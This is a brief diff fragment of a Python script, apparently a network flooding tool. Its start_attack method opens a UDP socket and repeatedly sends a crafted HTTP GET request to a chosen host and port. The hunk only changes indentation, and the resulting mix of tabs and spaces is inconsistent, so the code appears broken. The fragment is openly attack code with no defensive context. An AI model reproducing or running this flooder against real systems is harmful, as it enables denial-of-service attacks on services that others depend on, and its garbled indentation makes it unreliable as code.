@@ -42,9 +42,9 @@ while attemps < 100:
 		
     def start_attack(self,host,port=None):
 	    self.sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
-		try:
-			url_path=str(string.ascii_letters + string.digits + string.punctuation)
-			byt = (f"GET /{url_path} HTTP/1.1\nHost: {host}\n\n").encode()
+		    try:
+		    	url_path=str(string.ascii_letters + string.digits + string.punctuation)
+			    byt = (f"GET /{url_path} HTTP/1.1\nHost: {host}\n\n").encode()
 			if not port:
 				self.sock.sendto(byt,(host,80))
 			elif port:
